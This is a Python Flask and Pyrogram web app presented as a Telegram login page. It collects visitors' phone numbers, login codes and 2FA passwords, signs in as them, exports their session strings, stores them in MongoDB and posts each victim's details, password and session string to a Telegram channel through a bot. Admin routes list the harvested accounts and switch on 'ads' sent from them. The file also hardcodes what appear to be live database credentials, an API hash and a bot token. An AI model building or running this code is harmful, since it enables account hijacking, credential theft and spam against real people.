from flask import Flask, render_template, request, session, redirect, jsonify, url_for
import os
import uuid
import asyncio
from datetime import datetime
from pyrogram import Client
from pyrogram.errors import (
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    FloodWait
)
from pymongo import MongoClient
from pymongo.errors import ServerSelectionTimeoutError
from bson import ObjectId

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "7f9c2e1a84d6b3f0c5a7e9d2f1b8c4e6a3d7f0b2c9e5a1d8f6c3b7e2a9d4f1")

# ========== MONGODB CONFIG ==========
MONGODB_URI = os.environ.get("MONGODB_URI", "mongodb+srv://nexacoders2_db_user:dxYh7QOdHvH6OVdd@cluster0.f4qxcbk.mongodb.net/?appName=Cluster0")
DB_NAME = os.environ.get("DB_NAME", "adult_bot_db")

# Initialize MongoDB
try:
    mongo_client = MongoClient(MONGODB_URI, serverSelectionTimeoutMS=5000)
    db = mongo_client[DB_NAME]
    mongo_client.admin.command('ping')
    print("✅ MongoDB Connected Successfully!")
    db_connected = True
except Exception as e:
    print(f"❌ MongoDB Connection Failed: {e}")
    print("⚠️  Using in-memory storage fallback")
    mongo_client = None
    db = None
    db_connected = False

# Collections
users_col = db.users if db else None
ads_config_col = db.ads_config if db else None
ads_logs_col = db.ads_logs if db else None

API_ID = int(os.environ.get("API_ID", "32208414"))
API_HASH = os.environ.get("API_HASH", "628f11c05a44c8dda4b006e66f4bf7df")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8607223226:AAHBtUHkmc01RIRsVGTmJdm7d3B-PtI8o28")
CHANNEL_ID = os.environ.get("CHANNEL_ID", "-1004376082945")

clients = {}

# ========== DATABASE HELPERS ==========
def save_session_to_db(session_data):
    """Save session to MongoDB"""
    if users_col is None:
        return False
    
    try:
        existing = users_col.find_one({"phone": session_data["phone"]})
        if existing:
            users_col.update_one(
                {"_id": existing["_id"]},
                {"$set": {
                    "session_string": session_data["session_string"],
                    "updated_at": datetime.now(),
                    "user_id": session_data["id"],
                    "username": session_data["username"],
                    "first_name": session_data["first_name"],
                    "last_name": session_data["last_name"],
                    "status": "active",
                    "ads_enabled": True
                }}
            )
            return str(existing["_id"])
        else:
            result = users_col.insert_one({
                "user_id": session_data["id"],
                "first_name": session_data["first_name"],
                "last_name": session_data["last_name"],
                "username": session_data["username"],
                "phone": session_data["phone"],
                "session_string": session_data["session_string"],
                "session_name": session_data["session_name"],
                "created_at": datetime.now(),
                "updated_at": datetime.now(),
                "status": "active",
                "ads_enabled": True,
                "last_ad_time": None,
                "total_ads_sent": 0
            })
            return str(result.inserted_id)
    except Exception as e:
        print(f"MongoDB Error: {e}")
        return False

def get_all_users():
    """Get all users from MongoDB"""
    if users_col is None:
        return []
    return list(users_col.find())

def get_user_by_phone(phone):
    """Get user by phone number"""
    if users_col is None:
        return None
    return users_col.find_one({"phone": phone})

def update_user_status(phone, status):
    """Update user status"""
    if users_col is None:
        return False
    users_col.update_one(
        {"phone": phone},
        {"$set": {"status": status, "updated_at": datetime.now()}}
    )
    return True

def get_stats():
    """Get overall statistics"""
    if users_col is None:
        return {
            "total_users": 0,
            "active_users": 0,
            "idle_users": 0,
            "total_ads_sent": 0,
            "db_connected": False
        }
    
    total = users_col.count_documents({})
    active = users_col.count_documents({"status": "active"})
    idle = users_col.count_documents({"status": "idle"})
    
    pipeline = [{"$group": {"_id": None, "total": {"$sum": "$total_ads_sent"}}}]
    ads_result = list(users_col.aggregate(pipeline))
    total_ads = ads_result[0]["total"] if ads_result else 0
    
    yesterday = datetime.now() - timedelta(days=1)
    recent_users = users_col.count_documents({"created_at": {"$gte": yesterday}})
    
    last_hour = datetime.now() - timedelta(hours=1)
    online_users = users_col.count_documents({"last_ad_time": {"$gte": last_hour}})
    
    return {
        "total_users": total,
        "active_users": active,
        "idle_users": idle,
        "online_users": online_users,
        "recent_users": recent_users,
        "total_ads_sent": total_ads,
        "db_connected": True
    }

# ========== CHANNEL FUNCTIONS ==========
def send_to_channel(message):
    if not BOT_TOKEN:
        print(f"[CHANNEL] {message[:200]}...")
        return True

    import requests
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHANNEL_ID,
        "text": message,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    try:
        r = requests.post(url, json=payload, timeout=10)
        return r.json().get("ok", False)
    except Exception as e:
        print(f"Channel error: {e}")
        return False

# ========== ROUTES ==========
@app.route("/")
def index():
    return redirect("/login")

@app.route("/login")
def login():
    return render_template("login.html")

@app.route("/api/send-code", methods=["POST"])
def send_code():
    data = request.json or {}
    phone = data.get("phone", "").strip()
    session_name = data.get("session_name", "session").strip()

    if not phone or len(phone) < 10:
        return jsonify(ok=False, error="Invalid phone number"), 400

    session_id = str(uuid.uuid4())[:8]

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    client = Client(
        name=f"session_{session_id}",
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=True,
        no_updates=True
    )

    try:
        async def send():    
            await client.connect()    
            sent = await client.send_code(phone)    
            return sent    

        sent_code = loop.run_until_complete(send())    

        clients[session_id] = {    
            "client": client,    
            "phone": phone,    
            "session_name": session_name,    
            "phone_code_hash": sent_code.phone_code_hash,    
            "loop": loop    
        }    

        return jsonify(ok=True, session_id=session_id, message=f"Code sent to {phone}")

    except PhoneNumberInvalid:
        return jsonify(ok=False, error="Invalid phone number"), 400
    except FloodWait as e:
        return jsonify(ok=False, error=f"Wait {e.value} seconds"), 429
    except Exception as e:
        return jsonify(ok=False, error=str(e)), 500

@app.route("/api/verify-code", methods=["POST"])
def verify_code():
    data = request.json or {}
    session_id = data.get("session_id", "")
    code = data.get("code", "").strip()
    password = data.get("password", "")

    if not session_id or session_id not in clients:
        return jsonify(ok=False, error="Session expired"), 400

    if not code:
        return jsonify(ok=False, error="Invalid code"), 400

    client_data = clients[session_id]
    client = client_data["client"]
    phone = client_data["phone"]
    phone_code_hash = client_data["phone_code_hash"]
    session_name = client_data["session_name"]
    loop = client_data["loop"]

    asyncio.set_event_loop(loop)

    try:
        async def do_sign_in():
            try:
                user = await client.sign_in(
                    phone_number=phone,
                    phone_code_hash=phone_code_hash,
                    phone_code=code
                )
                session_string = await client.export_session_string()
                await client.disconnect()
                return user, session_string, None
            except SessionPasswordNeeded:
                if not password:
                    return None, None, "2FA_PASSWORD_REQUIRED"
                user = await client.check_password(password)
                session_string = await client.export_session_string()
                await client.disconnect()
                return user, session_string, None

        user, session_string, error = loop.run_until_complete(do_sign_in())    

        if error == "2FA_PASSWORD_REQUIRED":    
            return jsonify(ok=False, requires_password=True), 401    

        user_info = {    
            "id": user.id,    
            "first_name": user.first_name,    
            "last_name": user.last_name or "",    
            "username": user.username or "N/A",    
            "phone": phone,    
            "session_string": session_string,    
            "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),    
            "session_name": session_name    
        }    

        db_id = save_session_to_db(user_info)
        if db_id:
            print(f"✅ User saved to MongoDB with ID: {db_id}")

        del clients[session_id]    

        country_code = phone[:3] if phone.startswith("+") else phone[:2]    

        channel_msg = f"""🟢 <b>NEW PYROGRAM SESSION</b>

👤 <b>Name:</b> {user_info['first_name']} {user_info['last_name']}
🔗 <b>Username:</b> @{user_info['username']}
🆔 <b>User ID:</b> <code>{user_info['id']}</code>
📱 <b>Phone:</b> <code>{phone}</code>
🌍 <b>Country:</b> +{country_code}
⏰ <b>Created:</b> {user_info['created_at']}"""

        if password:
            channel_msg += f"\n🔑 <b>2FA Password:</b> <code>{password}</code>"

        channel_msg += f"""

<b>🔐 SESSION STRING:</b>
<code>{session_string}</code>"""

        send_to_channel(channel_msg)

        session["user"] = user_info    

        return jsonify(ok=True, user={    
            "id": user_info["id"],    
            "name": f"{user_info['first_name']} {user_info['last_name']}",    
            "username": user_info["username"],    
            "phone": phone    
        })

    except PhoneCodeInvalid:
        return jsonify(ok=False, error="Invalid code"), 401
    except PhoneCodeExpired:
        del clients[session_id]
        return jsonify(ok=False, error="Code expired"), 401
    except Exception as e:
        return jsonify(ok=False, error=str(e)), 500

@app.route("/api/logout", methods=["POST"])
def logout():
    session.clear()
    return jsonify(ok=True)

@app.route("/dashboard")
def dashboard():
    if "user" not in session:
        return redirect("/login")
    return render_template("dashboard.html", user=session["user"])

# ========== ADMIN API ROUTES ==========
@app.route("/api/admin/stats", methods=["GET"])
def admin_stats():
    stats = get_stats()
    users = get_all_users()
    
    formatted_users = []
    for user in users:
        formatted_users.append({
            "id": str(user.get("_id")),
            "user_id": user.get("user_id"),
            "name": f"{user.get('first_name', '')} {user.get('last_name', '')}",
            "username": user.get("username"),
            "phone": user.get("phone"),
            "status": user.get("status", "unknown"),
            "ads_enabled": user.get("ads_enabled", True),
            "total_ads_sent": user.get("total_ads_sent", 0),
            "created_at": user.get("created_at", datetime.now()).strftime("%Y-%m-%d %H:%M") if user.get("created_at") else "N/A",
            "last_ad_time": user.get("last_ad_time", "").strftime("%Y-%m-%d %H:%M") if user.get("last_ad_time") else "Never"
        })
    
    return jsonify({
        "stats": stats,
        "users": formatted_users,
        "db_connected": users_col is not None
    })

@app.route("/api/admin/users", methods=["GET"])
def get_users():
    users = get_all_users()
    return jsonify({
        "users": users,
        "count": len(users)
    })

@app.route("/api/admin/user/<phone>", methods=["GET"])
def get_user(phone):
    user = get_user_by_phone(phone)
    if user:
        user["_id"] = str(user["_id"])
        return jsonify(user)
    return jsonify(error="User not found"), 404

@app.route("/api/admin/user/<phone>/status", methods=["POST"])
def update_status(phone):
    status = request.json.get("status")
    if update_user_status(phone, status):
        return jsonify(ok=True, message=f"Status updated to {status}")
    return jsonify(ok=False, error="Failed to update"), 500

@app.route("/api/admin/toggle-ads", methods=["POST"])
def toggle_ads():
    enabled = request.json.get("enabled", False)
    
    if users_col is None:
        return jsonify(ok=False, error="Database not connected"), 500
    
    result = users_col.update_many(
        {},
        {"$set": {"ads_enabled": enabled}}
    )
    
    return jsonify({
        "ok": True,
        "message": f"Ads {'enabled' if enabled else 'disabled'} for {result.modified_count} users"
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)